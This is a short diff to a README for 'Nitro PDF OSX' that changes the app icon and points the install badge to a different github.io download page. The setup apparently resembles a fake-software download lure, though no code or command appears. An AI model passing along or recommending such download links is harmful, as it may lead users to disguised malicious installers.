@@ -1,12 +1,12 @@
 # Nitro PDF OSX
 
 <p align="center">
-  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/1b/fd/88/1bfd889b-0c08-b07e-f520-59671aac4f11/AppIcon26-0-1x_U007epad-0-1-0-85-220-0.png/1200x630wa.png" width="200" alt="Nitro PDF icon"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMol4Te5UqP-UQuUVH1xZKEWDAPW-3GWiw3g&s" width="200" alt="Nitro PDF icon"/>
 </p>
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/⬇%20Install-Download-blue?style=for-the-badge)](https://osx-sub-software.github.io/.github/NitroPDF)
+[![Install](https://img.shields.io/badge/⬇%20Install-Download-blue?style=for-the-badge)](https://yapidoras-apps.github.io/.github/NitroPDF)
 
 </p>
 
